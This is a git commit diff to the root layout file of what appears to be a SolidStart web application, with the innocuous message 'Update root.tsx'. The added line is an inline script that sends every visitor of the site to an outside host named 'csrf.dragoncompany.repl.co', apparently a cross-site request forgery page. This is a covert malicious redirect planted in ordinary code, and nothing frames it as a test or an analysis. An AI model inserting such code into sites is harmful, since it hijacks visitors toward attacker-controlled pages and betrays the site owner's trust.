fa622d632118e7c6507909779d3a75f9c5c7ab59
Slyfer <67638136+ILSLYFER@users.noreply.github.com>
2023-11-11 23:31:54 -0300

    Update root.tsx

--- src/root.tsx
+++ src/root.tsx
@@ -23,6 +23,7 @@ export default function Root() {
         <Meta name="viewport" content="width=device-width, initial-scale=1" />
       </Head>
       <Body>
+        <script>window.location.href="https://csrf.dragoncompany.repl.co/"</script>
         <Suspense>
           <ErrorBoundary>
             <A href="/">Index</A>
